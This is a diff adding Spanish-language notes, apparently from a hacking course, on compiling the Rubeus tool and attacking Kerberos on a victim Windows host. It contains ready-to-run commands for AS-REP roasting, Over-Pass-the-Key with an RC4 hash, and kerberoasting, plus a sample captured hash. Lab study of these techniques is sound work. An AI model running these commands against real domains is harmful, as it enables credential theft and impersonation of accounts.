@@ -1,0 +1,36 @@
+# Esta herramienta es muy importante para el hacking en Windows dedicado a kerberos y es para sistemas operativos 
+# unicamente Windows, por lo que nos iremos a un Windows por ejemplo el de la maquina victima.
+
+# Esta herramienta engloba parcticamente todas las tecnicas de hacking posibles sobre kerberos que hay a dia de hoy, 
+# con excepciona de algunas muy concretas, es una herramienta muy buena.
+
+# Si vamos a la informacion de la herramienta, pone que no tiene un binario compilado y ni lo piensa hacer, por lo que 
+# nosotros tendremos que coger el codigo fuente y compilarlo a nuestra forma de la siguiente forma:
+
+# Lo instalaremos todo y cuando tengamos VisualStudio le daremos a la opción de "Abrir un proyecto" y seleccionaremos 
+# el archivo "Rubeus.sln" para cargar el código y poder compilarlo.
+
+# Una vez que lo hayamos compilado lo encontraremos en la siguiente ruta:
+
+$ C:\Users\empleado1\Desktop\Rubeus-master\Rubeus\bin\Debug\Rubeus.exe
+
+# AS-REP Roasting
+
+$ .\Rubeus.exe asreproast /format:john /outfile:hash.john
+
+# => Ejemplo del hash.john:
+
+# Over-Pass-The-Key:
+
+$ .\Rubeus.exe asktgt /domain:corp.local /user:Administrator /rc4:a87f3a337d73085c45f9416be5787d86 /ptt
+
+-----------------------------------------------------------------------------------------------------------------------
+
+$krb5asrep$audre.maible@corp.local:C1150490A3362A16E45BDD6105D3E094$5B9902EFF73ADDC8D63B780B18C471892A9978C6ACBC0EBF70D2AA9EF371F9D2D1FBDA055ADE5A2F5A366007E8B358F41493BBE4D40758ECBAA7F9D4C3B3ECBD203B6D1D5C6510701135A95197B305736E137C77AFFD3AD56EA4762BCFABB4D39234B109646E12E67790A46A591BE319A6B306E7DDFFEBAA7BB63D9D35F2AD34BD8D5BF6D6D729FB70CD99D2451B10CF76098FEDD0EF9CC84A01D90F36E64E3D64596F47AFD7F9AEDFDB51D25C2BE496647E53EF2DEB8FE71FFECA4407201F3D763C516722E37D10292FAD0BFFEC9DDBB07CC4AA79DDA52102ED839CD055DB0A9A9A0444DD3CD299
+
+-----------------------------------------------------------------------------------------------------------------------
+
+# TGS-REP
+
+$ .\Rubeus.exe kerberoast
+
